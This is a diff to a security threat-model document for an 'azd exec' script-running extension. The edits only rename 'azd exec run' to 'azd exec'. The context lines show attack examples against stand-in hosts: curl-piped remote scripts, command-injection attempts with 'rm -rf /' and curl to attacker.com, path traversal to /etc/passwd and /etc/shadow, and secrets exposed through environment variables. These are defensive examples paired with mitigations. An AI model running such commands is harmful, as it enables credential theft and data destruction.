@@ -25,12 +25,12 @@ This document analyzes potential attack vectors from a malicious actor's perspec
 # Victim finds this in a "helpful" blog post or GitHub gist
 # Title: "Quick script to fix common azd deployment issues"
 
-curl -s https://attacker-site.com/fix-azd.sh | azd exec run -
+curl -s https://attacker-site.com/fix-azd.sh | azd exec -
 
 # OR (more subtle)
 git clone https://github.com/fake-user/azd-helpers
 cd azd-helpers
-azd exec run ./scripts/optimize-deployment.sh
+azd exec ./scripts/optimize-deployment.sh
 ```
 
 **Malicious Script Content** (`fix-azd.sh`):
@@ -105,7 +105,7 @@ azd extension install azd-exec-pro  # "Pro" version sounds better!
 **Attack Scenario**:
 ```bash
 # User on compromised WiFi (coffee shop, airport)
-curl http://example.com/deploy.sh | azd exec run -
+curl http://example.com/deploy.sh | azd exec -
 
 # Attacker intercepts HTTP request and injects:
 #!/bin/bash
@@ -154,7 +154,7 @@ export AZURE_CLIENT_SECRET="super-secret-value-123"
 export DATABASE_PASSWORD="admin123"
 
 # Later runs malicious script:
-azd exec run ./malicious.sh  # Gets both secrets!
+azd exec ./malicious.sh  # Gets both secrets!
 ```
 
 ---
@@ -217,19 +217,19 @@ go get github.com/spf13/cobra-utils
 **Failed Attack Attempts**:
 ```bash
 # Try 1: Semicolon injection
-azd exec run script.sh "; rm -rf /"
+azd exec script.sh "; rm -rf /"
 # ✅ BLOCKED: Args passed as separate array elements to exec.Command()
 
 # Try 2: Backtick command substitution
-azd exec run "script.sh" '`curl attacker.com`'
+azd exec "script.sh" '`curl attacker.com`'
 # ✅ BLOCKED: No shell interpolation
 
 # Try 3: Pipe injection
-azd exec run script.sh "| curl attacker.com"
+azd exec script.sh "| curl attacker.com"
 # ✅ BLOCKED: Pipe not interpreted
 
 # Try 4: Variable expansion
-azd exec run script.sh '$(/malicious/command)'
+azd exec script.sh '$(/malicious/command)'
 # ✅ BLOCKED: No variable expansion in arguments
 ```
 
@@ -250,16 +250,16 @@ return exec.Command(cmdArgs[0], cmdArgs[1:]...)  // Separate args, no shell
 **Failed Attack Attempts**:
 ```bash
 # Try 1: Relative path escape
-azd exec run ../../../etc/passwd
+azd exec ../../../etc/passwd
 # ✅ BLOCKED: filepath.Abs() resolves to absolute path, os.Stat() verifies file exists
 
 # Try 2: Symlink attack
 ln -s /etc/shadow ./innocent.sh
-azd exec run ./innocent.sh
+azd exec ./innocent.sh
 # ✅ PARTIALLY MITIGATED: Will execute symlink target, but requires write access to workspace
 
 # Try 3: TOCTOU (Time-of-check-time-of-use)
-azd exec run script.sh
+azd exec script.sh
 # (Attacker replaces script.sh between validation and execution)
 # ⚠️ THEORETICAL: Requires filesystem write access, narrow time window
 ```
@@ -316,7 +316,7 @@ done
 - name: Deploy with azd
   run: |
     curl https://raw.githubusercontent.com/attacker/scripts/main/deploy.sh -o deploy.sh
-    azd exec run ./deploy.sh
+    azd exec ./deploy.sh
 ```
 
 **Attack**:
@@ -337,7 +337,7 @@ done
 **Attack Flow**:
 ```
 1. Developer reads blog post: "Speed up azd deployments with this one script!"
-2. Copies command: `azd exec run <(curl -s https://blog.com/optimize.sh)`
+2. Copies command: `azd exec <(curl -s https://blog.com/optimize.sh)`
 3. Script exfiltrates Azure credentials
 4. Attacker uses credentials to:
    - Mine cryptocurrency on victim's Azure subscription
@@ -438,12 +438,12 @@ curl https://attacker.com/payload.sh | bash
 1. **Never pipe untrusted scripts to azd exec**:
    ```bash
    # ❌ DANGEROUS:
-   curl https://random-blog.com/script.sh | azd exec run -
+   curl https://random-blog.com/script.sh | azd exec -
    
    # ✅ SAFER:
    curl https://random-blog.com/script.sh -o script.sh
    # Review script.sh contents first!
-   azd exec run script.sh
+   azd exec script.sh
    ```
 
 2. **Verify script sources**:
@@ -467,7 +467,7 @@ curl https://attacker.com/payload.sh | bash
 
 ```bash
 # Add optional --verify flag:
-azd exec run --verify ./script.sh
+azd exec --verify ./script.sh
 
 # Verifies script signature before execution:
 # 1. Check for .sig file
@@ -499,7 +499,7 @@ func filterSensitiveEnv(env []string) []string {
 }
 
 // Usage (opt-in):
-azd exec run --filter-env ./script.sh
+azd exec --filter-env ./script.sh
 ```
 
 **Recommendation 3: Audit Logging**
@@ -548,7 +548,7 @@ Users should monitor for:
    ```bash
    # Monitor with:
    sudo tcpdump -i any -w script-traffic.pcap &
-   azd exec run suspicious-script.sh
+   azd exec suspicious-script.sh
    ```
 
 2. **Unusual process spawning**:
